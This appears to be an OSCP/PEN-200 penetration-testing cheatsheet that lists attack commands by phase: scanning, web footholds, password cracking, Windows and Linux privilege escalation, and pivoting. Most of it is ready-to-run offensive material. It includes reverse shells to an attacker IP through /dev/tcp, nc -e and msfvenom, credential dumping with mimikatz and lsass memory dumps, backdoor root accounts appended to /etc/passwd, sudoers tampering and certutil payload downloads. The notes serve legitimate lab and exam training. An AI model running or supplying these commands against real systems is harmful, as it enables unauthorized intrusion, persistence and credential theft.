OSCP Cheatsheet

OSCP · PEN-200 Methodology

OSCP Cheatsheet

One reading column, grouped by where you are in the kill chain. Enumerate exhaustively, get the foothold, escalate, then pivot — the same commands you reach for on every box, tidied into phases.

Prep & misc Recon & enumeration Initial access & web Credential attacks Windows: enum & privesc Linux: enum & privesc AD, lateral & service RCE Pivoting & file transfer Quick Ref Mascot

Prep & misc

Every engagement

Housekeeping before you touch a target: fix the VPN MTU, know how to compile payloads, and keep the default-cred shortlist handy.

Compiling C Files

# When compiling C scripts, if "gcc" is not on the target machine, we can compile the script locally with the --static flag, and then transfer the compiled file to the target (typically for Windows)
$ x86_64-w64-mingw32-gcc --static -o shell.exe nc_revshell.c

$ gcc -shared -fPIC -o shared.so shell.c -Wl,--export-dynamic

01

Recon & enumeration

Map everything first

Enumerate hard before exploiting. Sweep ports, fingerprint services, then drill each one — web paths, SMB/FTP/LDAP/SNMP/SMTP/IMAP, databases, and exposed git.

Web Server Path Enumeration

$ Gobuster scan: gobuster dir -u http://192.168.69.69 -w /usr/share/dirb/wordlists/raft-medium-directories.txt
# When scanning for subdirectories, also check the path http://192.168.69.69/<machine_name> (might reveal a secret path)
# Wordlist order: common.txt -> raft-medium-directories.txt -> /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
# If nothing shows up, include extensions and run again:
$ gobuster dir -u http://192.168.69.69 -w /usr/share/dirb/wordlists/raft-medium-directories.txt -x php,txt,html

Nmap Scanning

# Scan the network range for valid IPs:
$ sudo nmap 10.129.2.0/24 -sn -oA tnet | grep for | cut -d" " -f5
# Scanning all ports:
$ sudo nmap -p- -Pn -v 192.168.69.69 -sS -A -T4
$ sudo nmap -n -sT -p- -T5 192.168.69.69
# TCP-SYN scan:
$ sudo nmap -sS 192.168.69.69
# UDP port scan:
$ sudo nmap -sU -p161 192.168.69.69
# Note: The more common and relevant UDP ports are 53 (DNS), 69 (TFTP), 161 (SNMP)
# Scanning with a script:
$ sudo nmap 10.129.24.28 -p 80 -sV --script vuln
# Where "vuln" is a script category
# Other categories include "default", "exploit", "safe", "discovery" etc.
$ sudo nmap 10.129.69.69 -sV -A (runs all default scripts)
# Firewall evasion (not really under OSCP):
# SYN scan (-sS):
$ sudo nmap 10.129.2.28 -p21,22,25 -sS -Pn -n --disable-arp-ping --packet-trace
# ACK scan (-sA):
$ sudo nmap 10.129.2.28 -p 21,22,25 -sA -Pn -n --disable-arp-ping --packet-trace
# Decoys (-D):
# Disguises the origin of the packet sent
$ sudo nmap 10.129.2.28 -p 80 -sS -Pn -n --disable-arp-ping --packet-trace -D RND:5
# "-D RND:5" = generate five random IP address that indicate the source IP
# DNS proxying (--source-port 53):
$ sudo nmap 10.129.2.28 -p50000 -sS -Pn -n --disable-arp-ping --packet-trace --source-port 53

Wordpress Enumeration

# User enumeration:
$ wpscan --url http://<url> --enumerate u
# Plugin enumeration:
$ wpscan --url http://<url> --enumerate ap
$ wpscan --url http://<url> --plugins-detection aggressive

Protocol Enumeration

SMB Enumeration
$ smbclient -N -L \\<IP>\
$ smbclient -N \\<IP>\share_name
$ smbclient -U 'username' \\<IP>\share_name
FTP ENUMERATION
# We can download the whole FTP server for faster enumeration using grep
$ wget -r ftp://anonymous:pass@<IP>:<PORT>
# Then using grep:
$ grep -r 'pass'
$ grep -r 'key'
# Note: If we have write access to the FTP server, we can run the command:
$ mput file.txt
$ FTP over SSL: lftp -u anonymous ftps://192.168.217.61
LDAP Enumeration
$ ldapsearch -v -x -b "DC=hutch,DC=offsec" -H "ldap://192.168.233.122"
SNMP Enumeration
$ snmpwalk -v1 -c public 192.168.69.69 NET-SNMP-EXTEND-MIB::nsExtendObjects
$ snmpwalk -v2c -c public 192.168.69.69
$ onesixtyone -c /opt/useful/seclists/Discovery/SNMP/snmp.txt 10.129.14.128
$ sudo nmap -sU -p161 --script *snmp* 192.168.69.69
SMTP Enumeration
$ sudo nmap -sV -sC <IP> -p25 --script smtp-open-relay
$ smtp-user-enum -M VRFY -U usernames.txt -t <IP> -w 60 (finding usernames)
# Can also try "RCPT" instead of "VRFY"
$ telnet 10.129.69.69 110 (to view emails)
# USER <username>
# PASS <password>
# LIST
# RETR <id>
# Note: 110 is the POP3 port
# Other ports may include 25 (SMTP), 143 (IMAP4) etc.
IMAP Enumeration
# Connecting to the IMAP server:
$ telnet <IP> 143
$ openssl s_client -connect <IP>:993 -crlf (for secure connection)
# To login with a username and password, do A1 LOGIN user pass
# Once logged in: https://www.atmail.com/blog/imap-commands/
# Useful commands:
$ TAG LIST "" "*" (lists the different inboxes)
$ TAG SELECT "INBOX.NAME" (note: the name of the inbox is case-sensitive)
$ TAG FETCH 1 BODY[HEADER]
# The "1" means the first email in the selected inbox
$ TAG FETCH 1 BODY[]
# Note: "TAG" is just an arbitrary string of characters (user-defined)
Ident Enumeration (Port 113)
$ ident-user-enum 192.168.213.60 22 113 139 445

Git Shit

# If a git repository is found, we can use git-dumper to copy the repository to our Kali machine
$ git-dumper http://192.168.10.69/.git ./repo_dump
# Cloning a git repo using SSH key:
$ GIT_SSH_COMMAND='ssh -i id_rsa -p43022' git clone git@192.168.141.125:/<repo-name>

Sql Stuff

MySQL
# NMAP enumeration:
$ sudo nmap IP_ADDRESS -sV -sC -p3306 --script mysql*
# Connecting to a remote MySQL database:
$ mysql -u USERNAME -p -h IP_ADDRESS -P PORT --skip-ssl
# Note: PORT is 3306 by default
# MySQL commands (once logged into the server):
$ show databases;
$ use <database>;
$ show tables;
$ show columns from <table>;
$ select * from <table>;
$ select * from <table> where <column> = "<string>";
MSSQL
# NMAP enumeration:
$ sudo nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port=1433,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER -sV -p1433 IP_ADDRESS
# Connecting to a remote MSSQL database:
$ impacket-mssqlclient USER:PASS@IP_ADDR -windows-auth
# MSSQL commands (once logged into the server):
$ select name from master..sysdatabases;
$ use <database>;
$ select name from sys.tables;
$ select * from <table>;
PostgreSQL
# Connecting to a remote PSQL database:
$ psql -h 192.168.178.47 -p 5437 -U postgres
# Note: default creds are postgres:postgres
02

Initial access & web

Get the first foothold

Turn a service into a shell: work login pages and default creds, chase public exploits, abuse file inclusion, and pivot through SSH.

Initial Access Vectors

# Note: For websites, our enumeration methodology should be:
# If there is a login page, try using default creds to get to an admin panel of some sort
# If default creds don't work, is there a password reset page, or a register page?
# If none of the above work, try SQLi
# If the service is non-standard, look up public exploits (either Google, or searchsploit <keyword>)
# Enumerate paths using gobuster and repeat the above steps for each interesting path
$ gobuster dir -u http://192.168.69.69 -w /usr/share/dirb/wordlists/raft-medium-directories.txt
# If the above fails, enumerate other ports/services before continuing
WordPress Exploits
# Enumeration:
# General enum: wpscan --url http://poop.com
# User enum: wpscan --url http://poop.com --enumerate u
# Plugin enum: wpscan --url http://poop.com --plugins-detection aggressive
# Admin Dashboard -> RCE techniques:
# If new plugins can be added and activated -> create a PHP web shell plugin -> RCE
# Adrotate plugin (5.8.6.2) -> upload a ZIP-ed PHP shell file as a banner image -> navigate to the uploaded file's URL to activate the shell (typically at /wordpress/wp-content/banners/file.php)

↗ https://github.com/jephk9/oscp-jewels/blob/main/services/wordpress-plugin-exploits.md

# WordPress plugin wpDiscuz 7.0.4 (PHP web shell -> RCE) https://www.exploit-db.com/exploits/49967

Local/Remote File Inclusion

# If a path redirects to a URL that looks like: http://xxx.com?page=index.php, we can try LFI and RFI
# LFI:
# Linux Poc:

↗ http://xxx.com?page=../../../../../../../../etc/passwd

# Windows PoC:

↗ http://xxx.com?page=../../../../../../../../Users/Administrator/NTUser.dat

# RFI:
# http://xxx.com?page=http://<KALI IP>/test.txt

Ssh Hacks

# Bruteforcing:
# NMAP bruteforce (100% blind):
$ nmap -p22 --script=/usr/share/nmap/scripts/ssh-brute.nse 192.168.169.69
# Hydra bruteforce (if we know usernames and/or passwords):
$ sudo hydra -L users.txt -P /usr/share/wordlists/rockyou.txt -s 22 ssh://192.168.169.69
# Creating + uploading a new identity file to login:
# Generate keypair using ssh-keygen
$ Upload the public key (id_rsa.pub) to the target
# If the authorized_keys file exists, add the public key to it
# We can also potentially replace the authorized_keys file by renaming our key.pub file to "authorized_keys" and uploading it
$ chmod 600 id_rsa (private key)
# Now we can login using our private key
03

Credential attacks

Crack & spray

Offline cracking and reuse. Identify the hash, feed it the right wordlist, and spray what you recover across the estate.

Password Cracking

# Using john:
$ john --wordlist=/usr/share/wordlists/rockyou.txt pass.txt
# To extract password-protected ZIP files:
$ zip2john file.zip > hashes.txt
$ john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
# Then use the resultant password to extract the ZIP
# To extract SSH keys' passphrases:
$ ssh2john id_rsa > ssh.hash
$ john --wordlist=/usr/share/wordlists/rockyou.txt ssh.hash
# Using hashcat:
# Identifying hashcat mode to use:
$ hashid -m '<HASH>'
# Using hashcat:
$ sudo hashcat -m 400 pass.txt /usr/share/wordlists/rockyou.txt --force
NOTE: SOME PASSWORDS MIGHT JUST BE BASE64 ENCODED!!!
# Telltale sign: It looks something like VFc5aWFXeHBlbVZJYVhOelUyVmxaSFJwYldVM05EYz0=
$ echo <base64 string> | base64 -d

Password Spraying

$ nxc smb ./hosts.txt -u users.txt -p pass.txt
# Where hosts.txt is a list of IP addresses
04

Windows: enum & privesc

Low priv → SYSTEM

Enumerate the host, then escalate: service-binary swaps, token-impersonation potatoes, SeDebug/SeBackup abuse, installer and DNS misconfigs.

Windows Enumeration

# Reading Powershell history:
$ gc (Get-PSReadLineOption).HistorySavePath
# Checking who owns a file/who has what permissions for a file:
$ icacls C:/path/to/file
# Looking for modifiable Windows services, service binaries, and scheduled tasks:
# We can use the SharpUp.exe tool from https://github.com/r3motecontrol/Ghostpack-CompiledBinaries
$ ./SharpUp.exe audit
# Looking for credentials:
# findstr /SIM /C:”password” *.txt *.ini *.cfg *.config *.xml
$ Get-ChildItem -Path "C:\Users" -Recurse -ErrorAction SilentlyContinue -Include *.ini,*.conf,*.xml,*.json,*.yaml,*.yml -File | Select-Object Path, LineNumber, Line
# Searching for .kdbx (password database) files:
# Using Powershell:
$ Get-ChildItem -Path C:\ -Filter *.kdbx -Recurse -ErrorAction SilentlyContinue
# Note: just searching for files in general:
$ Get-ChildItem -Path "C:\" -Recurse -Filter "filename.txt" -ErrorAction SilentlyContinue
# Using cmd:
$ dir C:\*.kdbx /s /a
# Using powershell:
$ Get-ChildItem -Path C:\ -Recurse -ErrorAction SilentlyContinue -Filter "*.kdbx"
# PowerUp.ps1 usage:
# To run:
# If in Powershell: Import-Module ./PowerUp.ps1
# If in cmd: powershell -ep bypass -f ./PowerUp.ps1
# To scan for vulnerabilities:
$ Invoke-AllChecks
# Mimikatz one-liner:
$ mimikatz.exe "privilege::debug" "token::elevate" "lsadump::sam" "sekurlsa::logonpasswords" "exit"
# Suppose we find some SAM, SYSTEM, and SECURITY files on a Windows system, we can crack them and extract hashes:
# E.g. Use the HiveNightmare exploit if all users are allowed to read the registry regardless of privilege levels
$ ./HiveMachine.exe
# Source: https://github.com/GossiTheDog/HiveNightmare
# To dump the hashes (on Kali): impacket-secretsdump -sam SAM -system SYSTEM -security SECURITY local

Windows Privilege Escalation

Replacing Windows Service Binaries
# Use Meterpreter to generate a reverse shell:
$ msfvenom -f exe -p windows/meterpreter/reverse_tcp lhost=<KALI IP> lport=<LISTENING PORT> -o file.exe
# Note: Just use the C reverse shell script instead
# x64 payload (standard): x86_64-w64-mingw32-gcc inpoop.c -o outpoop.exe
# x86 payload: i686-w64-mingw32-gcc nc_shell.c -o payload.exe
# DLL payload: x86_64-w64-mingw32-gcc -shared -o payload.dll nc_shell.c
# After uploading the malicious exe to Windows, replace the target binary with:
$ copy /Y "C:\Path\To\NewServiceFile.exe" "C:\Path\To\OldServiceFile.exe" (has to be run in cmd)
# If the above doesn't work, then just move files around:
$ move OldServiceFile.exe OldServiceFile.exe.old
$ move NewServiceFile.exe "C:\Path\To\OldServiceFile.exe"
# Then restart the service:
$ sc.exe stop <Service Name> (or "net stop <Service>")
$ sc.exe start <Service Name> (or "net start <Service>")
# Or if we don't have permissions to restart the service, just restart the system:
$ shutdown /r /t 0
SeImpersonatePrivilege
# Note: For Windows Se-Privilege PE vectors, if we find that the user has the SeTakeOwnership privilege but it's disabled, we can try to run the EnableAllTokenPrivs.ps1 to enable it
# Source: https://github.com/fashionproof/EnableAllTokenPrivs
$ ./EnableAllTokenPrivs.ps1
# Using PrintSpoofer.exe:
# Directly spawning a shell:
$ ./PrintSpoofer.exe -i -c powershell.exe
# Reverse shell method:
$ ./PrintSpoofer.exe -i -c "powershell -e <base64 shit>"
# Using SigmaPotato.exe:
# Adding an admin user:
$ ./SigmaPotato.exe "net user user pass /add"
$ ./SigmaPotato.exe "net localgroup Administrators user /add"
# Reverse shell method:
# Transfer the payload over to the target
$ ./SigmaPotato.exe "./rev_shell.exe"
# Using GodPotato.exe
$ ./GodPotato.exe -cmd "cmd /c nc.exe -e cmd.exe <KALI IP> <LISTENING PORT>"
# Note: If SigmaPotato doesn't work, we likely don't need to try this
# FOR X86 SYSTEMS: Use JuicyPotato
$ JuicyPotato32.exe -l 4444 -p c:\windows\system32\cmd.exe -a "/c c:\users\apache\desktop\nc.exe -e cmd.exe 192.168.45.197 4444" -t * -c {69AD4AEE-51BE-439b-A92C-86AE490E8B30}
# Note: Start a netcat listener before running
SeDebugPrivilege
# Dumping passwords:
$ C:\Tools\Procdump\procdump.exe -accepteula -ma lsass.exe lsass.dmp
# Note: the path of procdump.exe might change (use dir C:\procdump.exe /s in a cmd terminal to find it)
# Now run mimikatz and analyze the dump:
$ sekurlsa::minidump lsass.dmp
$ sekurlsa::logonpasswords
# Obtaining RCE as SYSTEM:
# Source: https://github.com/decoder-it/psgetsystem
# First identify a process that is running as SYSTEM and note the PID
$ tasklist
# Now in Powershell, import the exploit and run the module
$ . ./SeDebugPE.ps1
# ImpersonateFromParentPid -ppid <PID> -command "C:\Windows\System32\cmd.exe" -cmdargs ""
AlwaysInstallElevated
# Checking if the feature is enabled:
$ reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
$ reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
# Exploiting the misconfiguration:
$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.248 LPORT=6969 -a x64 --platform Windows -f msi -o poop.msi
$ Start netcat listener on selected port
# To run the payload, just do ./poop.msi on the target
DnsAdmins DLL Hijacking
# If the user is part of the DnsAdmins group, we may be able to hijack a DNS dll to add the current user to the Domain Admins group
# Create a payload and transfer it to the target:
# Note: Compile the add_user_to_group.c script with x86_64-w64-mingw32-gcc -shared -o poop.dll add_user_to_group.c
# Commands (RUN IN CMD, NOT POWERSHELL):
$ dnscmd.exe /config /serverlevelplugindll C:\absolute\path\to\payload (DNS DLL hijack)
$ sc.exe stop dns
$ sc.exe start dns
$ shutdown /l
# Once we re-login to the target, we should have been added to the Domain Admins group
Password Hunting
# SeTakeOwnershipPrivilege
# Taking ownership of a file:
$ takeown /f 'C:\path\to\file'
$ icacls 'C:\path\to\file' /grant user:F
# SeBackupPrivilege
# Note: If the user is part of the "Backup Operators" group, they will be able to abuse the SeBackup privilege to copy and read restricted files
# Source: https://github.com/k4sth4/SeBackupPrivilege
# Commands:
$ Import-Module .\SeBackupPrivilegeUtils.dll
$ Import-Module .\SeBackupPrivilegeCmdLets.dll
$ Copy-FileSeBackupPrivilege 'C:\path\to\file' .\copied_file
# Event Log Readers Group
# If the user is part of the "Event Log Readers" group, we will be able to read security logs and potentially uncover passwords
$ wevtutil qe Security /rd:true /f:text | Select-String "/user"
05

Linux: enum & privesc

Low priv → root

Walk the low-hanging fruit first (sudo -l, SUID, cron, writable files), then the group and capability routes to root.

Linux Enumeration

General Enumeration Guide
# Low-hanging fruits:
$ sudo -l (sudo -> root commands)
$ sudo -v (possible vulnerable sudo version)
# uname -a (possible kernel exploits)
# Check on searchsploit
# Slightly harder (but still easy) vectors:
$ /etc/crontab
# id (privileged groups)
$ lxd, docker, adm, disk
# Writeable /etc/passwd?
# Writeable/readable /etc/shadow?
# Binaries with SUID bit enabled
$ find / -perm -4000 -type f 2>/dev/null | xargs -I{} ls -l {}
Pls don't go here I will cry:
$ ss -ntplu
# SQL databases
# Manual enumeration of files:
$ ls /opt
$ Start from current working directory (where the foothold was gained), then work outwards
Useful Commands
# Check Linux version:
# uname -a
# We might be able to find a kernel exploit to PE to root
# Checking for local ports
$ ss -ntplu
# Enumerate common directories for weird stuff:
$ ls -la /opt
# Check if we can run any sudo commands as the current user:
$ sudo -l (use GTFO bins if any possible commands appear)
# Check if the sudoers file is writable:
# Can give ourselves sudo privileges
$ ls -la /etc/sudoers /etc/sudoers.d/
# Check for writable files:
$ find / -path /proc -prune -o -type f -perm -o+w 2>/dev/null
# Check for SUID files that are writable:
$ find / -perm -4000 -type f 2>/dev/null | xargs -I{} ls -l {}
# E.g. We can try looking for uncommon files under /usr/bin
# Check if /etc/passwd and /etc/shadow are writable:
# Can edit them to change passwords
$ ls -l /etc/passwd /etc/shadow
# Check if any binaries in system directories are writable:
# Can replace them with malicious versions
$ find /usr/bin /bin -writable -type f 2>/dev/null
# Check for writable config files (typically in /etc):
$ find /etc -writable -type f 2>/dev/null
# Check for writable directories that are owned by root:
# By replacing files with malicious ones, they might get executed with root privileges
$ find / -type d -writable 2>/dev/null | grep -v "^/proc" | grep -v "^/sys"
# Check for writable cron jobs:
$ ls -l /etc/cron.d /etc/cron.daily /etc/cron.hourly /etc/cron.monthly /etc/cron.weekly
$ cat /etc/crontab
# Check for writable systemd service unit files:
# Modify them to execute arbitrary commands as root
$ find /etc/systemd/system /lib/systemd/system -writable -type f 2>/dev/null
# Check if the SSH config file is writable:
$ ls -l /etc/ssh/sshd_config
# Check for .kdbx files:
$ find / -name *.kdbx 2>/dev/null
# Finding strings in files:
$ grep -rnw / -e "string" 2>/dev/null

Linux Privilege Escalation

PE via "sudo -l"
$ Use GTFOBins for possible commands
# Note: If the following is shown, we can use this command (obtaining root via another user):
$ sudo -u user2 -g user2 /bin/bash
SUIT Bit Misconfiguration
# Some files might have the SUID bit set
$ find / -perm -4000 -type f 2>/dev/null | xargs -I{} ls -l {}
# Note: Files that normally have SUID bit set are…
# Anything not in this list might be worth a closer look
# All the /snap stuff is also generally useless
$ Use GTFOBins for possible commands
Writable /etc Files
$ /etc/passwd
# Generate a new password: openssl passwd -1 poop
# Add the new line to /etc/passwd: echo 'poopenheimer:$1$/Vmx6eoh$PmjFos9IP2G42xDrBg17l.:0:0::/root:/bin/bash' >> /etc/passwd
# Login as root: su poopenheimer
$ /etc/shadow
# Generate a new password: mkpasswd -m sha-512 poop
# Replace the password hash for the root user using the generated password
PATH Abuse
# Example usage:
# Add "/tmp" to the user's PATH:
# export PATH=/tmp:$PATH
# Create a command in the /tmp directory that does something else instead:
$ echo "/bin/bash" > /tmp/cat
$ chmod 755 /tmp/cat
# Now when "cat" is executed, a shell should be spawned
# If this fake "cat" is executed by root, we will get a root shell
# Normally, we look for files that have an SUID bit and perform this hack on irregular SUID files
$ find / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null
Wildcard Abuse (via cronjobs)
# This can be used if we find a cronjob that looks something like:
# */01 * * * * cd /home/htb-student && tar -zcf /home/htb-student/backup.tar.gz *
# The important bit being the "*" at the end
# We can leverage the wildcard to run bash files:
$ echo "" > '--checkpoint=1'
$ echo "" > '--checkpoint-action=exec=sh poop.sh'
$ echo "sh -i >& /dev/tcp/<KALI IP>/<PORT> 0>&1" > poop.sh
$ chmod 755 poop.sh
# If the reverse shell doesn't work, here are some alternatives:
$ echo 'echo "username ALL=(root) NOPASSWD: ALL" >> /etc/sudoers' > poop.sh (replace 'username' accordingly)
# Then do sudo -i to get root
$ echo 'chmod u+s /bin/bash' > poop.sh
# Then do /bin/bash -p
Escaping Restricted Shells
# Command injection:
# Passing other commands in commands that we are permitted to run
# E.g. ls -l "pwd"
# Command substitution:
# Using the output of one command as the argument of another command
# E.g. echo "Today is: $(date)"
# Command chaining:
# Using multiple commands in a single line to execute our desired command
# E.g. echo "poop"; pwd
# Random methods from ChatGPT:
# SSH directly into a bash shell:
$ ssh user@<target IP> 'bash'
# Python shell (works only if Python is part of the PATH):
$ python3 -c "import pty; pty.spawn('/bin/bash')"
$ python -c 'import pty; pty.spawn("/bin/bash")' (same as above, but for Python 2)
$ python -c "import os; os.system('/bin/bash')"
# Using vim/vi:
$ vi
$ :!bash (within the vi UI)
Privileged Groups
# Abusing "lxd" membership:
$ unzip alpine.zip
$ lxd init
$ lxc image import alpine.tar.gz alpine.tar.gz.root --alias alpine
$ lxc init alpine r00t -c security.privileged=true
$ lxc config device add r00t mydev disk source=/ path=/mnt/root recursive=true
$ lxc start r00t
$ lxc exec r00t /bin/sh
# Abusing "docker" membership:
$ docker run -v /root:/mnt -it ubuntu
# We can then add SSH keys to /mnt/.ssh, which will be "mapped" to the /root/.ssh file
$ ssh-keygen -t rsa -b 4096 -f /root/poop_key
$ cat /root/poop_key.pub >> /mnt/.ssh/authorized_keys
$ chmod 600 /mnt/.ssh/authorized_keys
$ chmod 700 /mnt/.ssh
$ cat /root/poop_key (to copy and use the private key)
# Other group memberships that can potentially be abused:
# adm (admin log reader)
# Allows the user to look at log files (e.g. /var/log/auth.log, /var/log/syslog, /var/log/apache2/access.log, /var/log/apache2/error.log
# We might potentially find passwords for privileged users in these log files
# disk
# Allows the user to read all files in /dev
# Example PE route:
$ df -h
$ debugfs /dev/sda3 (assuming /dev/sda3 mounts the required folders)
# mkdir test (to view filesystem permissions)
$ cat /root/.ssh/id_rsa
$ cat /etc/shadow
Linux Daemon (LXD)
# Note: To use this, we must be part of either the "lxc" or "lxd" group
# If we find a container file (usually in a ".tar.xz" file format) on the target, we can use it to PE
# Commands:
$ lxc image import container_file.tar.xz --alias poop
$ lxc init poop privesc -c security.privileged=true
$ lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true
$ lxc start privesc
$ lxc exec privesc /bin/bash
# Can also use "/bin/sh" if bash isn't available
# We can then access the host system as root, where /mnt/root will be the root directory of the original system
Docker
$ Docker group
# If the current user is part of the "docker" group, we can enumerate docker images:
$ docker image ls
$ Docker shared directories
# Accessing and enumerating a docker container might yield non-standard directories on the docker's filesystem
# E.g. SSH private keys
$ Docker sockets
# A ".sock" file that allows us and processes to communicate with the Docker daemon
# We can use the "docker" binary to interact with the socket
# Method 1 (creating a Docker container):
$ docker ps (we can extract the image name of the Docker container from here)
$ docker run --rm -d --privileged -v /:/hostsystem <image_name>
$ docker exec -it <container_ID> /bin/bash (to login to the container)
# Method 2 (if the socket is writable):
$ docker run -v /:/mnt --rm -it <image_name> chroot /mnt bash
Capabilities
# When capabilities are set for a binary, it means that it will be able to perform specific actions that would otherwise not be possible
# Important examples:
# "cap_sys_admin" = allows to perform actions with admin privileges
# "cap_setuid" = allows a process to set its effective user ID
# "cap_setgid" = allows a process to set its effective group ID
# "cap_dac_override" = allows bypassing of file read, write, and execute permission checks
# Enumerating capabilities:
$ find /usr/bin /usr/sbin /usr/local/bin /usr/local/sbin -type f -exec getcap {} \;
# Example exploitation of "cap_dac_override":
# Suppose enumeration reveals that "/usr/bin/vim.basic" has the "cap_dac_override" capability
$ echo -e ':%s/^root:[^:]*:/root::/\nwq!' | /usr/bin/vim.basic -es /etc/passwd
# We can then run "su" and upgrade to a root shell without authentication
Logrotate
# Conditions:
# Must have write permission on the log files
# Vulnerable versions: 3.8.6, 3.11.0, 3.15.0, 3.18.0
# Check using logrotate --version
# "logrotate" must be run as a privileged user or root
$ Use the logrotten exploit: https://github.com/whotwagner/logrotten.git
# Note: The log file used in the exploit must be one that is writable to the current user
$ Run the command as such: echo "penis" > /path/to/log/file && ./logrotten -p payload /path/to/log/file
# If the reverse shell is unstable, we can use the commands:
$ chmod 4777 $(which bash) (run in root shell to give SUID to bash)
$ bash -p (run in the initial low-privileged shell to get root)
LD_PRELOAD exploit
# If we find some .so file that we can write/inject
# Compile the shared library:
$ gcc -fPIC -shared -o exploit.so ld_preload.c -nostartfiles --static (where "ld_preload.c" is the exploit code)
# Now on the target, run (this is not necessary for machines that will automatically run the .so file):
$ sudo LD_PRELOAD=/path/to/exploit.so <vulnerable command from sudo -l>
# Note: Try using both the full path of the command and just the command itself
# Note: We need to be able to set the LD_PRELOAD environment variable for this to work

07

Pivoting & file transfer

Reach deeper, move files

Tunnel into internal subnets with chisel or ligolo-ng, and shuttle tools and loot on and off Windows targets.

Pivoting

Chisel SOCKS proxy (reverse tunneling)
$ chisel server --reverse --socks5 (on Kali)
$ ./chisel.exe client <KALI_IP>:8080 R:socks (on client)
Ligolo-ng
# Initial setup steps on Kali:
$ sudo ip tuntap add user kali mode tun ligolo
$ sudo ip link set ligolo up
# Note: To delete the interface upon completion:
$ sudo ip link delete ligolo
$ ligolo-proxy -selfcert (on Kali)
$ ./ligolo-agent.exe -connect <KALI_IP>:11601 -ignore-cert (on client)
# Note: 11601 is ligolo-ng's default proxy port
# Then connect to the session in the ligolo CLI
$ session + select an option
# Start the session:
$ start
# Then add the remote network to the ip route table:
$ sudo ip route add 172.16.69.0/24 dev ligolo
# Note: For localhost ports, add the magic ligolo IP instead:
$ sudo ip route add 240.0.0.5/32 dev ligolo
# To add a listener for tunneling purposes (e.g. catching reverse shells):
$ listener_add --addr 0.0.0.0:<PORT> --to 127.0.0.1:<PORT>
# The above command means "redirect all traffic to all interfaces (0.0.0.0) of the specified port to the specified port on the local Kali machine (127.0.0.1)"

Windows File Transfer

Powershell Download
$ iwr -uri http://192.168.45.69/file.exe -outfile file.exe
Certutil.exe Download
$ certutil.exe -urlcache -split -f http://192.168.45.69/file.exe
Netcat
# On Kali:
$ nc -nvlp 4444 | pv > OUTPUT
# On Windows (run in cmd):
$ nc.exe <KALI_IP> 4444 < INPUT
SMB
# On Kali:
$ sudo systemctl restart smbd
# Note: I already set up the SMB share drive on Kali
# On Windows:
$ net use \\<KALI_IP>\Shared
Evil-WinRM
$ upload kali.file C:\windows\output\path
$ download windows.file /home/kali/output/path
Meterpreter Shell
$ upload /path/to/kali/file
$ download /path/to/remote/file
